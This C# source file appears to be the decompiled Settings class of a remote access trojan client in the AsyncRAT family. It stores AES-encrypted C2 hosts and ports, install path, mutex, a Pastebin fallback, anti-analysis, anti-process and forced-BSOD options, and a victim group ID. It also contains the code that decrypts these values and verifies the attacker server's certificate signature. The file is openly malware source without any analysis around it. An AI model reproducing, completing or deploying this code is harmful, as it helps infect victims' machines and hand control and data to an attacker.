using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;

namespace Client;

public static class Settings
{
	public static string Por_ts = "tofjRrmWFl3qAKmJZC29WB2Sd9ex1i2UuCc/TPUxW6mcydCUfQWXbQRtp2g7mjnhuSOEKBVs1hlrDXfiAbD43g==";

	public static string Hos_ts = "WT5Kqz1F9xJ+HQfLdBBg0nU4iSQL6i2Jc17coZD6434zPQsBlUu7Rlo39KQYSWm15tQ0zKwXegvTYzoaPcb5dM/UiVvRt3IwxcPdTZNgGfQ=";

	public static string Ver_sion = "bgkp8PfVZ09YN4eXvu+IvXQKzAGprZdLrsnI8bbOekEIMmyYM8VxLXGnerOw5mtZHHf4Qp4pMy/2YdtcDLF1tQ==";

	public static string In_stall = "FaDtXGD6jnOIc83tP9l7qDVdvVhnYVJ3QQ1kJuD21LTZoQXWfMNuvjHpexnvMAiNT2Sq4fftvqybZoafomo8lA==";

	public static string Install_Folder = "%AppData%";

	public static string Install_File = "";

	public static string Key = "SExzRk9tZTVTenBLU1JEa0huSU4xQndzdTJzOXg3Tm8=";

	public static string MTX = "SmrPhYgAD5HylIvTTc4vUYeqfyukZO6y0l91cJgEBCRGN6QUWN+4iiZ/smlpebJw9gWbEdc519RlzuzXitPmhe5nGrshUpV5ftJEY2okEck=";

	public static string Certifi_cate = "8x1Q06f2m/xwcPx4Mtl93opE9+P513Vakrx4pZ4/wLmo4kRHfgqxtQ6r3HIgHRCpyRK0ppi8MYrgiAIbRvHXONd7RlMHDpph4u+d0/uOtTVa99L887+Lrws9bOEB06LmUQ1cS+HDY4InCNkw+3/N61gFOkXhWOOXHV6q8WaCg2+MHD8Xjao/2bkzRWokxOYQDi6jkSALtQ6fTWOq0fRiw/+aEfpYelH8RKglSS5qAvWXJN7jsQqaSEpRD7+NTQvXHoxjfJuj/eexgUP5SLdFrU8IGRJJZjHNTPxROH4GK4DXMLHH2Pv3zji7h52TgPjCyGVj7oGHZtjt5mRcjgERriU9/Pdxg/P/u4HQSN7nHZR8a0nMI1aqCujM6i7+6gFsCEzspK6TSZN/xUgQ16UudXGX6m/FuLfeaVkQCD2taGVaeDCtBWF7cMmcTFSO75yeoCLLDwwhfc7rbKmx3ApAXyqFba5ZjgUs+30xnuWO1IRl/dqMuXHKwCuxabT57XCfxs8+44qyga3wq4/15civ21j9KvHFqWaggIdKhH82tatTSNUpOKW/6TcSqtq5/jMG3bJnTKo+TNUJlVxP5foUfJqoE8tBCgVQgPMjkegfJDIFNQAAAlNfZurtFWxZuJCvK5cMYXG7mMrTjmLrQ3lFRWYhV7UG5pdkaj2gfNJx4vcJUlSRVb7SXq/EIsDVg5YS4oBEgucAgykBnT4cj76s2togFlX+XfqbEk+gS0BcfFnWZwt4mnMRxdQdTdyFCW3xx35wwyYPPk3XlYiU73d5EHz7VE4ksgsrII+3+SwNkMINERl533qcgICa8NkVjZs123AorI9WAeeij5qGYQyJUNHxsVvb9xb1baIgNbvNV8rBQsoHIGVfICql1K7xyjvEs6pw49tW2u5p+mMylIU3TZFkco18D8vxFtpH+YMbQZQtmHlhaJ3zGjZgQMk6IbEm6tYpgoGV8IhRfmV8Sy/FUaVIchz3oCY00HjpD487aBSq2xW5AEazGGip97VlMJaVR7vaQXxMyxV/6UXalz4/xgF77VAQObExi+yjux3yPq9OffiGm5s/o/gIzSeecfS9";

	public static string Server_signa_ture = "gEtAxrYSsF4cJ4+YRsTVQYvXDRDdBBAjov0DLBkDU4d6RY9S3tiMCRrNdv6w8vWld9ppuMADWQ47UAuc/dSjJbWZR7FHPKgrtqIkE2TXR6/K2FUolkPGVJGMZToGPKtFLZ+FkC/gpzbROnmogOMspqEEJOBBC7r4RuEpk2z3TTO7ePW0aIewfXOomXPi/rtDwscR08iguEfFJ/lZzT0LJcAkMTu2UqHlpe1/Iwas1Z+CF7ChErXHeAJkIIy4k5YGwkklHIYYHCcL88maNzBrv0eWGLs9aFsOxDGEqKstoyY=";

	public static X509Certificate2 Server_Certificate;

	public static Aes256 aes256;

	public static string Paste_bin = "JkM8/1t3EP1rhch6vcm60qI6GmS7EsCJHj/sT8jX4g8H9shZMk/7SUssxj7uq1q1worDNPPVyHWDCeIY9Tck1A==";

	public static string BS_OD = "yEgcgKKmcMUA4jRNjnWtlcudJiJ5I8AqTaVez2lCSCZaq1AshUJBasBNdYVc3KUxOFmu+Wj900Jd4i06kRAA1w==";

	public static string Hw_id = null;

	public static string De_lay = "1";

	public static string Group = "Ei/G+eC7tCu1LhuJBwSwd+7rgWnniLN+oIcG0t46l9p0sZZfHNoLveRWZjnfKFog4coNwjkhu9ADJS8Q8AtE2g==";

	public static string Anti_Process = "HV1lRb3qZ2mL8fdiLE2Jbwqoo4Qa8BFuaP0CVAfzgYBRfmCFuRIFRhTMc8S6J4YgHCRlWG5fIrs0ODuoGyjC2g==";

	public static string An_ti = "B78qSCvcxjOUc+/+lB9VBzzkCpIt9rQIXw43BngqH7zQcD/L5lOuuzjxTR1nlceqkLOPRtfUu9fbjAnGfUElTA==";

	public static bool InitializeSettings()
	{
		try
		{
			Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
			aes256 = new Aes256(Key);
			Por_ts = aes256.Decrypt(Por_ts);
			Hos_ts = aes256.Decrypt(Hos_ts);
			Ver_sion = aes256.Decrypt(Ver_sion);
			In_stall = aes256.Decrypt(In_stall);
			MTX = aes256.Decrypt(MTX);
			Paste_bin = aes256.Decrypt(Paste_bin);
			An_ti = aes256.Decrypt(An_ti);
			Anti_Process = aes256.Decrypt(Anti_Process);
			BS_OD = aes256.Decrypt(BS_OD);
			Group = aes256.Decrypt(Group);
			Hw_id = HwidGen.HWID();
			Server_signa_ture = aes256.Decrypt(Server_signa_ture);
			Server_Certificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certifi_cate)));
			return VerifyHash();
		}
		catch
		{
			return false;
		}
	}

	private static bool VerifyHash()
	{
		try
		{
			RSACryptoServiceProvider rSACryptoServiceProvider = (RSACryptoServiceProvider)Server_Certificate.PublicKey.Key;
			using SHA256Managed sHA256Managed = new SHA256Managed();
			return rSACryptoServiceProvider.VerifyHash(sHA256Managed.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Server_signa_ture));
		}
		catch (Exception)
		{
			return false;
		}
	}
}
